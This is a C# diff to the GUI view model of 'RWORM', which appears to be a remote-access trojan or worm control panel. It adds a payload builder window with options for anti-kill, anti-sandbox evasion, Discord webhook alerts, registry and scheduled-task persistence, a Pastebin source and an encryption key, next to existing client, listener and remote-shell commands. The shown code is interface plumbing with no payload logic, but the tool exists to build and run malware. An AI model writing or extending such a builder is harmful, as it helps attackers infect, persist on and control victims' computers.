@@ -45,6 +45,17 @@ namespace RWORM.GUI.ViewModels
         private bool   _buildTaskEnabled;
         private string _buildTaskUrl    = "";
 
+        // Surveillance & Evasion builder options
+        private bool   _buildAntiKill;
+        private bool   _buildAntiSandbox;
+        private bool   _buildDiscordAlert;
+        private string _buildDiscordWebhook = "";
+        private bool   _buildStartupRegistry;
+        private bool   _buildSchTasks;
+        private string _buildStartupPath = "%APPDATA%\\RWORM";
+        private string _buildPastebinRaw = "";
+        private string _buildEncryptionKey = "AES-256-DEFAULT";
+
         public event PropertyChangedEventHandler? PropertyChanged;
 
         public ObservableCollection<ClientModel>  Clients         { get; } = new();
@@ -87,6 +98,16 @@ namespace RWORM.GUI.ViewModels
         public bool   BuildTaskEnabled      { get => _buildTaskEnabled;      set { _buildTaskEnabled      = value; OnPropertyChanged(); } }
         public string BuildTaskUrl          { get => _buildTaskUrl;          set { _buildTaskUrl          = value; OnPropertyChanged(); } }
 
+        public bool   BuildAntiKill         { get => _buildAntiKill;         set { _buildAntiKill         = value; OnPropertyChanged(); } }
+        public bool   BuildAntiSandbox      { get => _buildAntiSandbox;      set { _buildAntiSandbox      = value; OnPropertyChanged(); } }
+        public bool   BuildDiscordAlert     { get => _buildDiscordAlert;     set { _buildDiscordAlert     = value; OnPropertyChanged(); } }
+        public string BuildDiscordWebhook   { get => _buildDiscordWebhook;   set { _buildDiscordWebhook   = value; OnPropertyChanged(); } }
+        public bool   BuildStartupRegistry  { get => _buildStartupRegistry;  set { _buildStartupRegistry  = value; OnPropertyChanged(); } }
+        public bool   BuildSchTasks         { get => _buildSchTasks;         set { _buildSchTasks         = value; OnPropertyChanged(); } }
+        public string BuildStartupPath      { get => _buildStartupPath;      set { _buildStartupPath      = value; OnPropertyChanged(); } }
+        public string BuildPastebinRaw      { get => _buildPastebinRaw;      set { _buildPastebinRaw      = value; OnPropertyChanged(); } }
+        public string BuildEncryptionKey    { get => _buildEncryptionKey;    set { _buildEncryptionKey    = value; OnPropertyChanged(); } }
+
         // ── Commands ──────────────────────────────────────────────────────────
         public ICommand ConnectCommand         { get; }
         public ICommand DisconnectCommand      { get; }
@@ -96,6 +117,7 @@ namespace RWORM.GUI.ViewModels
         public ICommand StartListenerCommand   { get; }
         public ICommand StopListenerCommand    { get; }
         public ICommand BuildCommand           { get; }
+        public ICommand OpenBuilderCommand     { get; }
 
         // Client context commands — all accept ClientModel parameter
         public ICommand OpenShellCommand          { get; }
@@ -138,7 +160,16 @@ namespace RWORM.GUI.ViewModels
 
             ConnectCommand        = new RelayCommand(async _ => await ConnectAsync(), _ => !IsConnected);
             DisconnectCommand     = new RelayCommand(_ => Disconnect(), _ => IsConnected);
-            NavigateCommand       = new RelayCommand(view => SelectedView = view?.ToString() ?? "Clients");
+            NavigateCommand       = new RelayCommand(view =>
+            {
+                var target = view?.ToString() ?? "Clients";
+                SelectedView = target;
+                if (target == "Builder")
+                {
+                    OpenBuilderWindow();
+                }
+            });
+            OpenBuilderCommand    = new RelayCommand(_ => OpenBuilderWindow());
             SendCommandCommand    = new RelayCommand(async _ => await SendCommandAsync(), _ => IsConnected && SelectedClient != null);
             RefreshClientsCommand = new RelayCommand(async _ => await RefreshClientsAsync(), _ => IsConnected);
             StartListenerCommand  = new RelayCommand(_ => StartListener(), _ => !ListenerRunning);
@@ -748,6 +779,31 @@ namespace RWORM.GUI.ViewModels
                 _serverProcess = null;
             }
             catch { }
+        }
+
+        // ── Builder Window ────────────────────────────────────────────────────
+        private Views.BuilderWindow? _builderWindow;
+        public void OpenBuilderWindow()
+        {
+            var dispatcher = System.Windows.Application.Current?.Dispatcher;
+            void Show()
+            {
+                if (_builderWindow == null || !_builderWindow.IsLoaded)
+                {
+                    _builderWindow = new Views.BuilderWindow(this);
+                    _builderWindow.Closed += (s, e) => _builderWindow = null;
+                    _builderWindow.Show();
+                }
+                else
+                {
+                    if (_builderWindow.WindowState == System.Windows.WindowState.Minimized)
+                        _builderWindow.WindowState = System.Windows.WindowState.Normal;
+                    _builderWindow.Activate();
+                }
+            }
+
+            if (dispatcher == null || dispatcher.CheckAccess()) Show();
+            else dispatcher.Invoke(Show);
         }
 
         // ── Builder ───────────────────────────────────────────────────────────
